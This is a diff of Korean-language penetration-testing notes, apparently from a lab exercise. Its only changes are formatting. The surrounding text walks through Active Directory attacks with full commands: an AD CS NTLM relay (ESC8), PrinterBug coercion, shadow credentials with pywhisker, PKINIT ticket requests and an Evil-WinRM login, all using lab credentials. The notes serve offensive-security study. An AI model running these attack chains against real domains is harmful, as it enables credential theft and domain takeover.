@@ -823,12 +823,12 @@ $ /opt/linikatz.sh
 ## Pass the Certificate
 
 ### AD CS NTLM Relay Attack (ESC8)
-- Impacket의 [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)를 사용하여 인바운드 연결을 수신하고 이를 web enrollment 서비스로 전달
+- Impacket의 [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)를 사용하여 인바운드 연결을 수신하고 이를 web enrollment 서비스로 전달<br/>
 ```$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication```<br/>
 > `--template`로 전달되는 값은 환경에 따라 다름([certipy](https://github.com/ly4k/Certipy) 와 같은 도구를 사용하여 열거 가능)
 
 - [프린터 버그](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) 활용 : 임의의 호스트에 대해 인증을 시도하도록 강제하는 방법
-- `Printer Spooler` 서비스가 실행 중이어야 함
+- `Printer Spooler` 서비스가 실행 중이어야 함<br/>
 ```$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12```<br/>
 
 - [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) 사용 : `Pass-the-Certificate` 공격을 수행하여 TGT를 `DC01$`로 얻을 수 있는 방법
@@ -850,10 +850,10 @@ $ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administr
 ```
 
 ### Shadow Credentials(msDS-KeyCredentialLink)
--  [pywhisker](https://github.com/ShutdownRepo/pywhisker)를 사용, `X.509 certificate`를 생성하여 피해사용자 `msDS-KeyCredentialLink`속성에 `public key`를 기록
+-  [pywhisker](https://github.com/ShutdownRepo/pywhisker)를 사용, `X.509 certificate`를 생성하여 피해사용자 `msDS-KeyCredentialLink`속성에 `public key`를 기록<br/>
 ```$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add```<br/>
 
-- `PFX (PKCS12)`​​파일이 생성되고(`eFUVVTPf.pfx`), 비밀번호가 표시되면 이 파일을 `gettgtpkinit.py` 와 함께 사용하여 피해사용자 TGT를 획득
+- `PFX (PKCS12)`​​파일이 생성되고(`eFUVVTPf.pfx`), 비밀번호가 표시되면 이 파일을 `gettgtpkinit.py` 와 함께 사용하여 피해사용자 TGT를 획득<br/>
 ```$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache```<br/>
 
 - TGT를 획득하면 다시 한 번 `pass the ticket`을 수행
@@ -862,6 +862,6 @@ $ export KRB5CCNAME=/tmp/jpinkman.ccache
 $ klist
 ```
 
-- 피해사용자가 `Remote Management Users` 그룹의 일원일 경우, `Evil-WinRM`을 사용하여 Kerberos로 연결 가능(`krb5.conf` 구성 확인)
+- 피해사용자가 `Remote Management Users` 그룹의 일원일 경우, `Evil-WinRM`을 사용하여 Kerberos로 연결 가능(`krb5.conf` 구성 확인)<br/>
 ```$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local```<br/>
 
